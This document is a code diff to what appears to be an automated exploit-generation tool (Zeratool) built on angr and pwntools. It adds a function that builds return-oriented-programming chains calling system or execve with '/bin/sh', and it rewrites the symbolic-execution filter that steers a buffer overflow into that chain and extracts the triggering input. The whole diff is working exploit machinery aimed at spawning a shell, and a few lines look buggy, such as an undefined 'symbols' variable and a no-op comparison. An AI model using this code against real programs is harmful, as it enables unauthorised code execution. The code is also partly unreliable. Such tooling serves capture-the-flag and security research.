@@ -2,6 +2,7 @@ import claripy
 from .radare_helper import findShellcode
 from pwn import *
 import timeout_decorator
+from zeratool import overflowExploitSender
 
 is_printable = False
 
@@ -47,6 +48,48 @@ def getShellcode(properties):
         assembly = shellcraft.sh()  # This works, but the shellcode is usually long
         shellcode = asm(assembly)
     return shellcode
+
+
+def get_rop_chain(properties):
+    context.binary = properties["file"]
+    elf = ELF(properties["file"])
+    rop = ROP(elf)
+
+    strings = [b"/bin/sh\x00", b"/bin/bash\x00"]
+
+    ret_symbol = None
+    ret_string = None
+
+    # Make this function compatible with 32bit and 64bit
+    pack = p32
+    if "64" in properties["protections"]["arch"]:
+        pack = p64
+
+    # Find the function we want to call
+    if "system" in elf.symbols:
+        ret_symbol = elf.symbols["system"]
+    elif "execve" in symbols:
+        ret_symbol = elf.symbols["execve"]
+    else:
+        raise RuntimeError("Cannot find symbol to return to")
+
+    # Find the string we want to pass it
+    for string in strings:
+        str_occurences = list(elf.search(string))
+        if str_occurences:
+            ret_string = str_occurences[0]
+            break
+
+    if not ret_string:
+        raise RuntimeError("Cannot find string to pass to system or exec call")
+
+    # movabs
+    rop.raw(rop.ret.address)
+    rop.call(ret_symbol, [ret_string])
+
+    print(rop.dump())
+
+    return rop.build()
 
 
 def find_symbolic_buffer(state, length, arg=None):
@@ -202,7 +245,9 @@ def point_to_shellcode_filter(simgr):
                         "[-] Unable to encode shellcode to avoid {}".format(avoidList)
                     )
                 except TypeError:
-                    raise RuntimeError("Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte")
+                    raise RuntimeError(
+                        "Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte"
+                    )
                 break
 
         # addresses = [x for x in find_symbolic_buffer(state,len(shellcode))]
@@ -262,211 +307,79 @@ There has to be a better way to genericize this
 
 
 def point_to_ropchain_filter(simgr):
-    for path in simgr.unconstrained:
-        bad_bytes = set()
-        rop_chain = getRopchain(properties, bad_bytes)
-        state = path.state
 
-        eip = state.regs.pc
-        bits = state.arch.bits
+    for state in simgr.unconstrained:
+        properties = state.globals["properties"]
+        rop_chain = get_rop_chain(properties)
 
-        state_copy = state.copy()
+        # my_buf = state.memory.load(address, len(rop_chain))
+        # first_gadget = state.memory.load(address,pc_size)
+        new_state = state.copy()
+        user_input = new_state.globals["user_input"]
 
-        addresses = [x for x in find_symbolic_buffer(state_copy, len(rop_chain))]
-        if len(addresses):
-            list.sort(addresses)
+        # Only amd64 right now
+        for gadget in rop_chain:
+            # Previous gadget set our symbolic value
+            if new_state.regs.rdi.symbolic and new_state.satisfiable(
+                extra_constraints=([new_state.regs.rdi == gadget])
+            ):
+                print("Setting RDI to {}".format(hex(gadget)))
+                new_state.add_constraints(new_state.regs.rdi == gadget)
 
-        for address in addresses:
-            my_buf = state_copy.memory.load(address, len(rop_chain))
-            if not state_copy.satisfiable(extra_constraints=([my_buf == rop_chain])):
-                print("[~] rop chain can't be placed. Checking for bad bytes.")
-                for i in range(len(rop_chain)):
-                    curr_byte = state_copy.memory.load(address + i, 1)
-                    if state_copy.satisfiable(
-                        extra_constraints=([curr_byte == rop_chain[i]])
-                    ):
-                        pass
-                    else:
-                        print(
-                            "[-] Address {} Byte {} Can't be {}".format(
-                                hex(address + i), i, repr(rop_chain[i])
-                            )
-                        )
-                        #                            byte_hex = hex(rop_chain[i]).rstrip('L').rstrip('0x')
-                        byte_hex = rop_chain[i].encode("hex")
-                        bad_bytes.add(byte_hex)
-                print("Avoiding : {}".format(bad_bytes))
-                print("Old ropchain: {} {}".format(len(rop_chain), repr(rop_chain)))
-
-                try:
-                    rop_chain = getRopchain(properties, bad_bytes)
-                except Exception as e:
-                    print(e)
-                    print("[-] Error building rop_chain. To many bad bytes?")
-                    exit(0)
+            # Set execution gadget
+            elif new_state.satisfiable(
+                extra_constraints=([new_state.regs.pc == gadget])
+            ):
+                print("Setting PC to {}".format(hex(gadget)))
+                new_state.add_constraints(new_state.regs.pc == gadget)
+                new_state = new_state.step().all_successors[0]
+            else:
+                print("not satis on {}".format(hex(gadget)))
                 break
 
-        addresses = [x for x in find_symbolic_buffer(state_copy, len(rop_chain))]
+        user_input = new_state.globals["user_input"]
 
-        for address in addresses:
-            print(("[+] Found address at {}\r".format(hex(address))), end=" ")
-            state_copy = state.copy()
+        input_bytes = get_trimmed_input(user_input, new_state)
 
-            padded_addr = 0
+        print("[+] Vulnerable path found {}".format(input_bytes))
 
-            if bits == 32:
-                padded_addr = p32(address)
-            elif bits == 64:
-                botAddr = address & 0xFFFFFFFF
-                topAddr = (address >> 32) & 0xFFFFFFFF
-                padded_addr = p32(topAddr) + p32(botAddr)
+        new_state.globals["type"] = "Overflow"
+        new_state.globals["input"] = input_bytes
+        simgr.stashes["found"].append(new_state)
+        break
 
-            my_buf = state.memory.load(address, len(rop_chain))
-
-            # Constrain pc to rop_chain
-            constraints = constrainToAddress(state_copy, eip, address)
-
-            # Setup rop_chain
-            memory = state_copy.memory.load(address, len(rop_chain))
-            rop_chain_bvv = state_copy.se.BVV(rop_chain)
-
-            constraints.append(memory == rop_chain_bvv)
-
-            # Setup endianness - A weird number of CTF problems have endianess issues
-            state_eb = state.copy()
-
-            # Constrain EIP to rop_chain address
-            constraints_le = constrainToAddress(state, eip, address, endian="little")
-            constraints_eb = constrainToAddress(state_eb, eip, address, endian="big")
-
-            # Check satisfiability
-            if (
-                state_copy.se.satisfiable(extra_constraints=constraints)
-                and state_eb.se.satisfiable(extra_constraints=constraints_eb)
-                and state.se.satisfiable(extra_constraints=constraints_le)
-                and len(constraints_eb) == 4
-                and len(constraints_le) == 4
-            ):
-                print("[+] Win")
-                for constraint in constraints:
-                    state_copy.add_constraints(constraint)
-
-                # Check by input
-                if (
-                    state_copy.globals["inputType"] == "STDIN"
-                    or state_copy.globals["inputType"] == "LIBPWNABLE"
-                ):
-                    if all(
-                        [x in state_copy.posix.dumps(0) for x in padded_addr]
-                    ) and all([x in state_copy.posix.dumps(0) for x in rop_chain]):
-
-                        # Constrain STDIN to printable if we can
-                        if state.se.satisfiable(extra_constraints=constraints_le):
-                            for constraint in constraints:
-                                state.add_constraints(constraint)
-
-                        # Constrain STDIN to printable if we can
-                        if state_eb.se.satisfiable(extra_constraints=constraints_eb):
-                            for constraint in constraints_eb:
-                                state_eb.add_constraints(constraint)
-
-                        # Setup rop_chain
-                        memory = state.memory.load(address, len(rop_chain))
-                        rop_chain_bvv = state.se.BVV(rop_chain)
-
-                        # Setup rop_chain constraints
-                        if state.se.satisfiable(
-                            extra_constraints=[memory == rop_chain_bvv]
-                        ):
-                            state.add_constraints(memory == rop_chain_bvv)
-
-                        # Setup rop_chain
-                        memory = state_eb.memory.load(address, len(rop_chain))
-                        rop_chain_bvv = state_eb.se.BVV(rop_chain)
-
-                        # Setup rop_chain constraints
-                        if state_eb.se.satisfiable(
-                            extra_constraints=[memory == rop_chain_bvv]
-                        ):
-                            state_eb.add_constraints(memory == rop_chain_bvv)
-
-                        # Little Endian
-                        # Constrain rest of input to be printable
-                        stdin = state.posix.files[0]
-                        constraints = []
-                        # stdin_size = len(stdin.all_bytes())
-                        stdin_size = 100
-                        stdin.length = stdin_size
-                        stdin.seek(0)
-                        stdin_bytes = stdin.all_bytes()
-                        for i in range(stdin_size):
-                            curr_byte = stdin.read_from(1)
-                            constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
-                            if state.se.satisfiable(extra_constraints=[constraint]):
-                                constraints.append(constraint)
-
-                        # Constrain STDIN to printable if we can
-                        if state.se.satisfiable(extra_constraints=constraints):
-                            for constraint in constraints:
-                                state.add_constraints(constraint)
-
-                        # Big Endian
-                        # Constrain rest of input to be printable
-                        stdin = state_eb.posix.files[0]
-                        constraints = []
-                        # stdin_size = len(stdin.all_bytes())
-                        stdin_size = 100
-                        stdin.length = stdin_size
-                        stdin.seek(0)
-                        stdin_bytes = stdin.all_bytes()
-                        for i in range(stdin_size):
-                            curr_byte = stdin.read_from(1)
-                            constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
-                            if state_eb.se.satisfiable(extra_constraints=[constraint]):
-                                constraints.append(constraint)
-
-                        # Constrain STDIN to printable if we can
-                        if state_eb.se.satisfiable(extra_constraints=constraints):
-                            for constraint in constraints:
-                                state_eb.add_constraints(constraint)
-
-                        # Get the string coming into STDIN
-                        # stdin_str = repr(str(state.posix.dumps(0).replace('\x00\x00\x00','').replace('\x01','')))
-                        stdin_str = repr(str(state.posix.dumps(0)))
-                        print("[+] Vulnerable path found {}".format(stdin_str))
-                        state.globals["type"] = "Overflow"
-                        state.globals["state_eb"] = state_eb
-                        simgr.stashes["found"].append(path)
-                        try:
-                            simgr.stashes["unconstrained"].remove(path)
-                        except (KeyboardInterrupt, timeout_decorator.TimeoutError) as e:
-                            pass
-                        break
-
-                if state_copy.globals["inputType"] == "ARG":
-                    arg = state.globals["arg"]
-                    arg_str = str(state_copy.solver.eval(arg, cast_to=str))
-                    if "A" in arg_str:
-                        constraints = []
-                        for i in range(bits / 8):
-                            curr_byte = eip.get_byte(i)
-                            constraint = claripy.And(curr_byte == 0x41)
-                            constraints.append(constraint)
-
-                        for i in range(arg.length):
-                            curr_byte = arg.read_from(1)
-                            constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
-                            if state.se.satisfiable(extra_constraints=[constraint]):
-                                constraints.append(constraint)
-
-                        # Constrain STDIN to printable if we can
-                        if state.se.satisfiable(extra_constraints=constraints):
-                            for constraint in constraints:
-                                state.add_constraints(constraint)
-
-                        arg_str = str(state.solver.eval(arg, cast_to=str))
-                        print("[+] Vulnerable path found {}".format(arg_str))
-                        state.globals["type"] = "Overflow"
-                        simgr.stashes["found"].append(path)
-                        simgr.stashes["unconstrained"].remove(path)
     return simgr
+
+
+def get_trimmed_input(user_input, state):
+    trim_index = -1
+    index = 0
+    for c in user_input.chop(8):
+        num_constraints = get_num_constraints(c, state)
+        if num_constraints == 0 and trim_index == -1:
+            trim_index = index
+        else:
+            trim_index == -1
+        index += 1
+
+    input_bytes = state.solver.eval(user_input, cast_to=bytes)
+
+    if trim_index > 0:
+        print("Found input without constraints starting at {}".format(trim_index))
+        print("Trimming")
+        return input_bytes[:trim_index]
+
+    return input_bytes
+
+
+def get_num_constraints(chop_byte, state):
+    constraints = state.solver.constraints
+    i = 0
+    # Do any constraints mention this BV?
+    for constraint in constraints:
+        if any(
+            chop_byte.structurally_match(x) for x in constraint.recursive_children_asts
+        ):
+            i += 1
+    # print("{} : {} : {}".format(chop_byte,i,state.solver.eval(chop_byte,cast_to=bytes)))
+    return i
